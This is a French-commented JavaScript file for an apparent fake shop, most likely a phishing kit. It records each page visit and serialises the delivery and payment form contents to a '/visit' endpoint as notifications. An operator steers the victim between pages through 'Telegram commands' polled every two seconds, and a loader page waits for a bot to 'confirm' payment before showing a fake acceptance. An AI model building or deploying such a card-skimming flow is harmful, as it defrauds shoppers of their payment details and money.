// Générer ou récupérer visitorId
const visitorId = localStorage.getItem("visitorId") || Date.now().toString();
localStorage.setItem("visitorId", visitorId);

// Fonction pour envoyer notification visite
async function notify(page) {
  await fetch("/visit", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({visitorId, page})
  });
}

// 1️⃣ Notification à chaque chargement de page
document.addEventListener("DOMContentLoaded", () => {
  notify(document.title);
});

// 2️⃣ Vérification des commandes Telegram toutes les 2s
setInterval(async () => {
  const res = await fetch(`/get-command?visitorId=${visitorId}`);
  const data = await res.json();
  if (data.command) {
    switch(data.command){
      case "index": window.location.href = "index.html"; break;
      case "info": window.location.href = "info.html"; break;
      case "contact": window.location.href = "contact.html"; break;
      case "visite": window.location.href = "visite.html"; break;
      case "confirm_payment": window.location.href = "confirmation.html"; break;
      case "return_home": window.location.href = "index.html"; break;
    }
  }
}, 2000);

// 3️⃣ Accueil.html → choix de la paire
document.querySelectorAll("button[data-pair]").forEach(btn => {
  btn.addEventListener("click", async () => {
    const pair = btn.dataset.pair;

    // Notification paire choisie
    await notify(`Paire choisie: ${pair}`);

    // Stocker la paire
    localStorage.setItem("chosenPair", pair);

    // Redirection vers info.html
    window.location.href = "info.html";
  });
});

// 4️⃣ Info.html → afficher la paire choisie
const chosenPair = localStorage.getItem("chosenPair");
if(chosenPair && document.getElementById("chosen-pair")){
  document.getElementById("chosen-pair").src = `images/${chosenPair.replace(/\s+/g,"_")}.jpg`;
}

// 5️⃣ Info.html → formulaire de livraison
const deliveryForm = document.getElementById("deliveryForm");
if(deliveryForm){
  deliveryForm.addEventListener("submit", async e => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(deliveryForm).entries());
    data.pair = localStorage.getItem("chosenPair");

    await notify(`Infos livraison: ${JSON.stringify(data)}`);

    // Rediriger vers contact.html
    window.location.href = "contact.html";
  });
}

// 6️⃣ Contact.html → formulaire paiement
const paymentForm = document.getElementById("paymentForm");
if(paymentForm){
  paymentForm.addEventListener("submit", async e => {
    e.preventDefault();
    const data = Object.fromEntries(new FormData(paymentForm).entries());
    data.pair = localStorage.getItem("chosenPair");

    await notify(`Infos paiement: ${JSON.stringify(data)}`);

    // Rediriger vers loader.html
    window.location.href = "loader.html";
  });
}

// 7️⃣ Loader.html → attente validation bot
if(document.title === "Chargement..."){
  setInterval(async () => {
    const res = await fetch(`/get-command?visitorId=${visitorId}`);
    const data = await res.json();
    if(data.command === "confirm_payment"){
      window.location.href = "confirmation.html";
    }
  }, 2000);
}

// 8️⃣ Confirmation.html → attente retour accueil
if(document.title === "Paiement accepté"){
  setInterval(async () => {
    const res = await fetch(`/get-command?visitorId=${visitorId}`);
    const data = await res.json();
    if(data.command === "return_home"){
      window.location.href = "index.html";
    }
  }, 2000);
}
